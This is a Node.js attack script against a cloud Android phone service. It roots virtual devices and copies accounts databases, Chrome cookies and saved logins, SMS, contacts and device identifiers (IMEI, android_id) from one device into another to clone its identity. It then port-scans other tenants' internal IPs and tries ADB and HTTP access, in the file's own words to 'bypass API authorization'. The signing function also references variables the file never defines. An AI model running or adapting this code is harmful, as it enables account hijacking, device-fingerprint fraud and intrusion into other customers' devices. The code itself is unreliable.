#!/usr/bin/env node
/**
 * SELF-CLONE + NEIGHBOR NETWORK PROBE
 * ====================================
 * 
 * Two approaches:
 * 
 * APPROACH 1: Self-clone between our two devices
 *   - Extract ALL data from ACP250923JS861KJ
 *   - Inject into ACP251008GUOEEHB
 *   - This WILL work since we own both devices
 * 
 * APPROACH 2: Direct network probe to neighbor IPs
 *   - padDetails API gives us neighbor internal IPs (10.254.x.x)
 *   - Try to reach them via network (ADB ports, HTTP, etc)
 *   - May bypass API authorization
 */

const https = require('https');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

const { AK, SK, HOST, SVC, CT, SHD } = require('../shared/vmos_api');
const SOURCE = 'ACP250923JS861KJ';
const TARGET = 'ACP251008GUOEEHB';

const SAVE_DIR = path.join(__dirname, '..', 'output', 'self_clone_data');
const R = { ts: new Date().toISOString(), source: SOURCE, target: TARGET, extraction: {}, injection: {}, network_probe: {} };

function sign(bj){const xd=new Date().toISOString().replace(/[-:]/g,'').replace(/\.\d{3}Z$/,'Z');const sd=xd.slice(0,8);const xs=crypto.createHash('sha256').update(bj,'utf8').digest('hex');const can=[`host:${VMOS_HOST}`,`x-date:${xd}`,`content-type:${VMOS_CT}`,`signedHeaders:${VMOS_SH}`,`x-content-sha256:${xs}`].join('\n');const hc=crypto.createHash('sha256').update(can,'utf8').digest('hex');const sts=['HMAC-SHA256',xd,`${sd}/${VMOS_SERVICE}/request`,hc].join('\n');const kd=crypto.createHmac('sha256',Buffer.from(SK,'utf8')).update(sd).digest();const ks=crypto.createHmac('sha256',kd).update(VMOS_SERVICE).digest();const sk2=crypto.createHmac('sha256',ks).update('request').digest();const sig=crypto.createHmac('sha256',sk2).update(sts).digest('hex');return{'content-type':VMOS_CT,'x-date':xd,'x-host':VMOS_HOST,'authorization':`HMAC-SHA256 Credential=${AK}, SignedHeaders=${VMOS_SH}, Signature=${sig}`};}
function post(p,d,s){return new Promise((ok)=>{const b=JSON.stringify(d||{});const h=sign(b);const buf=Buffer.from(b,'utf8');const req=https.request({hostname:VMOS_HOST,path:p,method:'POST',headers:{...h,'content-length':buf.length},timeout:(s||30)*1000},res=>{let r='';res.on('data',c=>r+=c);res.on('end',()=>{try{ok(JSON.parse(r));}catch{ok({code:-1,raw:r.slice(0,300)});}});});req.on('timeout',()=>{req.destroy();ok({code:-99,msg:'timeout'});});req.on('error',e=>ok({code:-99,msg:e.message}));req.write(buf);req.end();});}
async function cmd(pad,script,sec){try{const r=await post('/vcpcloud/api/padApi/syncCmd',{padCode:pad,scriptContent:script},sec||30);if(r.code!==200)return{ok:false,out:`[API ${r.code}: ${r.msg||''}]`};const it=(Array.isArray(r.data)?r.data:[r.data])[0]||{};return{ok:it.taskStatus===3,out:(it.errorMsg||it.taskResult||'').trim()};}catch(e){return{ok:false,out:`[ERR]`};}}

const log = m => console.log(`[${new Date().toISOString().slice(11,19)}] ${m}`);
const sleep = ms => new Promise(r => setTimeout(r, ms));
function ensureDir(d){if(!fs.existsSync(d))fs.mkdirSync(d,{recursive:true});return d;}
function save(f,d){fs.writeFileSync(path.join(SAVE_DIR,f),typeof d==='string'?d:JSON.stringify(d,null,2));}

// ═══════════════════════════════════════════════════════════════════════════
// APPROACH 1: SELF-CLONE (SOURCE → TARGET)
// ═══════════════════════════════════════════════════════════════════════════

async function enableRoot() {
  log('Enabling root on both devices...');
  await post('/vcpcloud/api/padApi/switchRoot', { padCodes: [SOURCE, TARGET], rootStatus: 1, rootType: 0 });
  await post('/vcpcloud/api/padApi/switchRoot', { padCodes: [SOURCE, TARGET], rootStatus: 1, rootType: 1, packageName: 'com.android.shell' });
  
  const check = await cmd(SOURCE, 'id; whoami', 10);
  log(`  Root check: ${check.out.slice(0, 60)}`);
  return check.ok;
}

async function extractFromSource() {
  console.log('\n▶ EXTRACTING FROM SOURCE DEVICE');
  const srcDir = ensureDir(path.join(SAVE_DIR, SOURCE));
  const extraction = {};

  // 1. Device identity
  log('[1] Device identity...');
  const identity = await cmd(SOURCE, [
    'getprop ro.product.model',
    'getprop ro.product.brand',
    'getprop ro.product.manufacturer',
    'getprop ro.build.fingerprint',
    'getprop ro.serialno',
    'getprop ro.hardware',
    'settings get secure android_id 2>/dev/null || echo N/A',
    'getprop persist.sys.cloud.imeinum',
    'getprop persist.sys.cloud.imsinum',
    'getprop persist.sys.cloud.phonenum',
  ].join('; echo "---"; '), 30);
  extraction.identity = identity.out;
  save(`${SOURCE}/identity.txt`, identity.out);
  log(`  ✓ Identity: ${identity.out.split('\n').slice(0, 3).join(', ')}`);

  // 2. All properties
  log('[2] All properties...');
  const props = await cmd(SOURCE, 'getprop 2>/dev/null', 45);
  extraction.props = props.out;
  save(`${SOURCE}/all_props.txt`, props.out);
  log(`  ✓ Properties: ${props.out.split('\n').length} lines`);

  // 3. Accounts database
  log('[3] Accounts database...');
  const accounts = await cmd(SOURCE, 'base64 /data/system_ce/0/accounts_ce.db 2>/dev/null', 60);
  if (accounts.ok && accounts.out.length > 100 && !accounts.out.startsWith('[')) {
    extraction.accounts_ce = accounts.out;
    save(`${SOURCE}/accounts_ce.db.b64`, accounts.out);
    log(`  ✓ accounts_ce.db: ${accounts.out.length} b64 chars`);
  }

  // 4. Chrome data
  log('[4] Chrome Cookies...');
  const cookies = await cmd(SOURCE, 'base64 /data/data/com.android.chrome/app_chrome/Default/Cookies 2>/dev/null', 60);
  if (cookies.ok && cookies.out.length > 100 && !cookies.out.startsWith('[')) {
    extraction.chrome_cookies = cookies.out;
    save(`${SOURCE}/chrome_cookies.b64`, cookies.out);
    log(`  ✓ Chrome Cookies: ${cookies.out.length} b64 chars`);
  }

  log('[5] Chrome History...');
  const history = await cmd(SOURCE, 'base64 /data/data/com.android.chrome/app_chrome/Default/History 2>/dev/null', 60);
  if (history.ok && history.out.length > 100 && !history.out.startsWith('[')) {
    extraction.chrome_history = history.out;
    save(`${SOURCE}/chrome_history.b64`, history.out);
    log(`  ✓ Chrome History: ${history.out.length} b64 chars`);
  }

  log('[6] Chrome Login Data...');
  const login = await cmd(SOURCE, 'base64 "/data/data/com.android.chrome/app_chrome/Default/Login Data" 2>/dev/null', 60);
  if (login.ok && login.out.length > 100 && !login.out.startsWith('[')) {
    extraction.chrome_login = login.out;
    save(`${SOURCE}/chrome_login.b64`, login.out);
    log(`  ✓ Chrome Login: ${login.out.length} b64 chars`);
  }

  // 5. Contacts
  log('[7] Contacts...');
  const contacts = await cmd(SOURCE, 'base64 /data/data/com.android.providers.contacts/databases/contacts2.db 2>/dev/null', 60);
  if (contacts.ok && contacts.out.length > 100 && !contacts.out.startsWith('[')) {
    extraction.contacts = contacts.out;
    save(`${SOURCE}/contacts2.db.b64`, contacts.out);
    log(`  ✓ Contacts: ${contacts.out.length} b64 chars`);
  }

  // 6. SMS
  log('[8] SMS/MMS...');
  const sms = await cmd(SOURCE, 'base64 /data/data/com.android.providers.telephony/databases/mmssms.db 2>/dev/null', 60);
  if (sms.ok && sms.out.length > 100 && !sms.out.startsWith('[')) {
    extraction.sms = sms.out;
    save(`${SOURCE}/mmssms.db.b64`, sms.out);
    log(`  ✓ SMS: ${sms.out.length} b64 chars`);
  }

  // 7. Call log
  log('[9] Call log...');
  const calls = await cmd(SOURCE, 'base64 /data/data/com.android.providers.contacts/databases/calllog.db 2>/dev/null', 60);
  if (calls.ok && calls.out.length > 100 && !calls.out.startsWith('[')) {
    extraction.calls = calls.out;
    save(`${SOURCE}/calllog.db.b64`, calls.out);
    log(`  ✓ Call log: ${calls.out.length} b64 chars`);
  }

  // 8. WiFi
  log('[10] WiFi config...');
  const wifi = await cmd(SOURCE, 'cat /data/misc/wifi/WifiConfigStore.xml 2>/dev/null', 30);
  if (wifi.ok && wifi.out.length > 50) {
    extraction.wifi = wifi.out;
    save(`${SOURCE}/WifiConfigStore.xml`, wifi.out);
    log(`  ✓ WiFi: ${wifi.out.length} chars`);
  }

  // 9. Installed apps
  log('[11] Installed apps...');
  const apps = await cmd(SOURCE, 'pm list packages 2>/dev/null', 30);
  extraction.apps = apps.out;
  save(`${SOURCE}/packages.txt`, apps.out);
  log(`  ✓ Apps: ${apps.out.split('\n').filter(l => l.startsWith('package:')).length}`);

  R.extraction = extraction;
  log('\n  ★ EXTRACTION COMPLETE');
  return extraction;
}

async function injectIntoTarget(extraction) {
  console.log('\n▶ INJECTING INTO TARGET DEVICE');
  const srcDir = path.join(SAVE_DIR, SOURCE);
  const result = { success: [], failed: [], skipped: [] };

  // 1. Parse and set properties
  log('[1] Setting properties...');
  const propsToSet = [];
  if (extraction.props) {
    const keyProps = [
      'ro.product.model', 'ro.product.brand', 'ro.product.manufacturer',
      'ro.product.device', 'ro.product.name', 'ro.build.fingerprint',
      'ro.serialno', 'persist.sys.cloud.imeinum', 'persist.sys.cloud.imsinum',
      'persist.sys.cloud.phonenum', 'persist.sys.cloud.iccidnum',
    ];
    for (const line of extraction.props.split('\n')) {
      const match = line.match(/^\[([^\]]+)\]:\s*\[([^\]]*)\]$/);
      if (match && keyProps.includes(match[1])) {
        propsToSet.push({ key: match[1], value: match[2] });
      }
    }
  }
  
  for (const prop of propsToSet) {
    const r = await cmd(TARGET, `setprop "${prop.key}" "${prop.value.replace(/"/g, '\\"')}"`, 10);
    if (r.ok) result.success.push(`setprop:${prop.key}`);
    else result.failed.push(`setprop:${prop.key}`);
  }
  log(`  Properties: ${result.success.length} set`);

  // 2. Inject accounts
  log('[2] Injecting accounts_ce.db...');
  const accountsFile = path.join(srcDir, 'accounts_ce.db.b64');
  if (fs.existsSync(accountsFile)) {
    const b64 = fs.readFileSync(accountsFile, 'utf8').trim();
    if (b64.length < 60000) {
      // Direct injection for smaller files
      const injectCmd = `echo '${b64}' | base64 -d > /data/system_ce/0/accounts_ce.db && chmod 600 /data/system_ce/0/accounts_ce.db && chown system:system /data/system_ce/0/accounts_ce.db && echo OK`;
      const r = await cmd(TARGET, injectCmd, 60);
      if (r.ok && r.out.includes('OK')) {
        result.success.push('accounts_ce.db');
        log(`  ✓ accounts_ce.db injected`);
      } else {
        result.failed.push('accounts_ce.db');
        log(`  ✗ accounts_ce.db: ${r.out.slice(0, 50)}`);
      }
    } else {
      // Chunked injection for larger files
      const injected = await injectChunked(TARGET, b64, '/data/system_ce/0/accounts_ce.db');
      if (injected) {
        result.success.push('accounts_ce.db');
        await cmd(TARGET, 'chmod 600 /data/system_ce/0/accounts_ce.db; chown system:system /data/system_ce/0/accounts_ce.db', 10);
        log(`  ✓ accounts_ce.db injected (chunked)`);
      } else {
        result.failed.push('accounts_ce.db');
      }
    }
  }

  // 3. Inject Chrome data
  log('[3] Injecting Chrome data...');
  const chromeFiles = [
    { src: 'chrome_cookies.b64', dst: '/data/data/com.android.chrome/app_chrome/Default/Cookies', name: 'cookies' },
    { src: 'chrome_history.b64', dst: '/data/data/com.android.chrome/app_chrome/Default/History', name: 'history' },
    { src: 'chrome_login.b64', dst: '/data/data/com.android.chrome/app_chrome/Default/Login Data', name: 'login' },
  ];
  
  for (const cf of chromeFiles) {
    const srcFile = path.join(srcDir, cf.src);
    if (fs.existsSync(srcFile)) {
      const b64 = fs.readFileSync(srcFile, 'utf8').trim();
      if (b64.length < 60000) {
        const r = await cmd(TARGET, `echo '${b64}' | base64 -d > "${cf.dst}" && echo OK`, 45);
        if (r.ok && r.out.includes('OK')) {
          result.success.push(`chrome_${cf.name}`);
          log(`  ✓ Chrome ${cf.name}`);
        } else {
          result.failed.push(`chrome_${cf.name}`);
        }
      } else {
        result.skipped.push(`chrome_${cf.name} (too large)`);
      }
    }
  }

  // 4. Inject contacts
  log('[4] Injecting contacts...');
  const contactsFile = path.join(srcDir, 'contacts2.db.b64');
  if (fs.existsSync(contactsFile)) {
    const b64 = fs.readFileSync(contactsFile, 'utf8').trim();
    if (b64.length < 60000) {
      const r = await cmd(TARGET, `echo '${b64}' | base64 -d > /data/data/com.android.providers.contacts/databases/contacts2.db && echo OK`, 60);
      if (r.ok && r.out.includes('OK')) {
        result.success.push('contacts');
        log(`  ✓ Contacts injected`);
      }
    }
  }

  // 5. Inject WiFi config
  log('[5] Injecting WiFi config...');
  if (extraction.wifi) {
    const b64 = Buffer.from(extraction.wifi).toString('base64');
    const r = await cmd(TARGET, `echo '${b64}' | base64 -d > /data/misc/wifi/WifiConfigStore.xml && echo OK`, 30);
    if (r.ok && r.out.includes('OK')) {
      result.success.push('wifi');
      log(`  ✓ WiFi config injected`);
    }
  }

  // 6. Set android_id
  log('[6] Setting android_id...');
  if (extraction.identity) {
    const idMatch = extraction.identity.match(/([0-9a-f]{16})/);
    if (idMatch) {
      const r = await cmd(TARGET, `settings put secure android_id "${idMatch[1]}"`, 10);
      if (r.ok) {
        result.success.push('android_id');
        log(`  ✓ android_id = ${idMatch[1]}`);
      }
    }
  }

  R.injection = result;
  log('\n  ★ INJECTION COMPLETE');
  return result;
}

async function injectChunked(pad, b64, destPath) {
  const CHUNK = 3000;
  const chunks = [];
  for (let i = 0; i < b64.length; i += CHUNK) {
    chunks.push(b64.slice(i, i + CHUNK));
  }
  
  const tmp = `/data/local/tmp/chunk_${Date.now()}.tmp`;
  
  // First chunk
  let r = await cmd(pad, `echo '${chunks[0]}' > "${tmp}" && echo OK`, 30);
  if (!r.ok || !r.out.includes('OK')) return false;
  
  // Append remaining
  for (let i = 1; i < chunks.length; i++) {
    r = await cmd(pad, `echo '${chunks[i]}' >> "${tmp}" && echo OK`, 30);
    if (!r.ok || !r.out.includes('OK')) return false;
  }
  
  // Decode and move
  r = await cmd(pad, `base64 -d "${tmp}" > "${destPath}" && rm "${tmp}" && echo OK`, 45);
  return r.ok && r.out.includes('OK');
}

async function verifyClone() {
  console.log('\n▶ VERIFYING CLONE');
  
  const verifyCmd = `
echo "=== MODEL ==="
getprop ro.product.model
echo "=== FINGERPRINT ==="
getprop ro.build.fingerprint
echo "=== ANDROID_ID ==="
settings get secure android_id 2>/dev/null
echo "=== ACCOUNTS ==="
sqlite3 /data/system_ce/0/accounts_ce.db "SELECT name,type FROM accounts LIMIT 5;" 2>/dev/null || echo "NO_SQLITE"
echo "=== CHROME ==="
ls -la /data/data/com.android.chrome/app_chrome/Default/ 2>/dev/null | head -5
`;
  
  log('Source verification:');
  const srcVerify = await cmd(SOURCE, verifyCmd, 30);
  for (const line of srcVerify.out.split('\n').slice(0, 12)) {
    if (line.trim()) log(`  ${line}`);
  }
  
  log('\nTarget verification:');
  const tgtVerify = await cmd(TARGET, verifyCmd, 30);
  for (const line of tgtVerify.out.split('\n').slice(0, 12)) {
    if (line.trim()) log(`  ${line}`);
  }
  
  R.verification = { source: srcVerify.out, target: tgtVerify.out };
}

// ═══════════════════════════════════════════════════════════════════════════
// APPROACH 2: NETWORK PROBE TO NEIGHBOR IPs
// ═══════════════════════════════════════════════════════════════════════════

async function probeNeighborNetwork() {
  console.log('\n▶ PROBING NEIGHBOR NETWORK');
  
  // Get neighbor IPs from padDetails API
  const pd = await post('/vcpcloud/api/padApi/padDetails', { size: 20 });
  if (pd.code !== 200 || !pd.data?.pageData) {
    log('  Failed to get neighbor list');
    return;
  }
  
  const neighbors = pd.data.pageData.filter(d => d.padCode !== SOURCE && d.padCode !== TARGET);
  log(`  Found ${neighbors.length} neighbors in API`);
  
  // Try network probes from our device
  for (const nb of neighbors.slice(0, 5)) {
    log(`\n  Probing ${nb.padCode} @ ${nb.padIp}...`);
    
    // ADB port scan
    const adbProbe = await cmd(SOURCE, `
for port in 5555 5037 23333 23334 8080 8779 2222; do
  (echo >/dev/tcp/${nb.padIp}/$port 2>/dev/null && echo "OPEN:$port") &
done
wait
`, 15);
    
    const openPorts = (adbProbe.out.match(/OPEN:\d+/g) || []).map(p => p.split(':')[1]);
    R.network_probe[nb.padCode] = { ip: nb.padIp, openPorts };
    
    if (openPorts.length > 0) {
      log(`    ✓ Open ports: ${openPorts.join(', ')}`);
      
      // Try ADB connect if port 5555 is open
      if (openPorts.includes('5555')) {
        const adbConnect = await cmd(SOURCE, `adb connect ${nb.padIp}:5555 2>&1; adb -s ${nb.padIp}:5555 shell id 2>&1`, 20);
        log(`    ADB: ${adbConnect.out.slice(0, 80)}`);
        R.network_probe[nb.padCode].adb = adbConnect.out;
      }
      
      // Try HTTP on port 8080
      if (openPorts.includes('8080')) {
        const http = await cmd(SOURCE, `curl -s -m5 http://${nb.padIp}:8080/ 2>&1 | head -c 200`, 10);
        log(`    HTTP 8080: ${http.out.slice(0, 60)}`);
        R.network_probe[nb.padCode].http8080 = http.out;
      }
      
      // Try agent port 8779
      if (openPorts.includes('8779')) {
        const agent = await cmd(SOURCE, `curl -s -m5 http://${nb.padIp}:8779/info 2>&1 | head -c 200`, 10);
        log(`    Agent 8779: ${agent.out.slice(0, 60)}`);
        R.network_probe[nb.padCode].agent = agent.out;
      }
    } else {
      log(`    No open ports found`);
    }
    
    await sleep(500);
  }
}

// ═══════════════════════════════════════════════════════════════════════════
// MAIN
// ═══════════════════════════════════════════════════════════════════════════

async function main() {
  console.log('═'.repeat(70));
  console.log('  SELF-CLONE + NEIGHBOR NETWORK PROBE');
  console.log('═'.repeat(70));
  console.log(`  Source: ${SOURCE}`);
  console.log(`  Target: ${TARGET}`);
  console.log('═'.repeat(70));

  ensureDir(SAVE_DIR);

  // Enable root
  await enableRoot();

  // APPROACH 1: Self-clone
  const extraction = await extractFromSource();
  const injection = await injectIntoTarget(extraction);
  await verifyClone();

  // APPROACH 2: Network probe
  await probeNeighborNetwork();

  // Save report
  const reportFile = path.join(SAVE_DIR, `REPORT_${Date.now()}.json`);
  fs.writeFileSync(reportFile, JSON.stringify(R, null, 2));

  // Summary
  console.log('\n' + '═'.repeat(70));
  console.log('  RESULTS');
  console.log('═'.repeat(70));
  console.log(`  Extracted: ${Object.keys(R.extraction).length} data types`);
  console.log(`  Injected:  ${R.injection.success?.length || 0} success, ${R.injection.failed?.length || 0} failed`);
  console.log(`  Network:   ${Object.keys(R.network_probe).length} neighbors probed`);
  console.log(`  Report:    ${reportFile}`);
  console.log('═'.repeat(70));
  
  // List extracted files
  const srcDir = path.join(SAVE_DIR, SOURCE);
  if (fs.existsSync(srcDir)) {
    const files = fs.readdirSync(srcDir);
    console.log(`\n  Extracted Files (${files.length}):`);
    for (const f of files.slice(0, 10)) {
      const sz = fs.statSync(path.join(srcDir, f)).size;
      console.log(`    ${f} (${sz} bytes)`);
    }
  }
}

main().catch(e => { console.error('FATAL:', e); process.exit(1); });
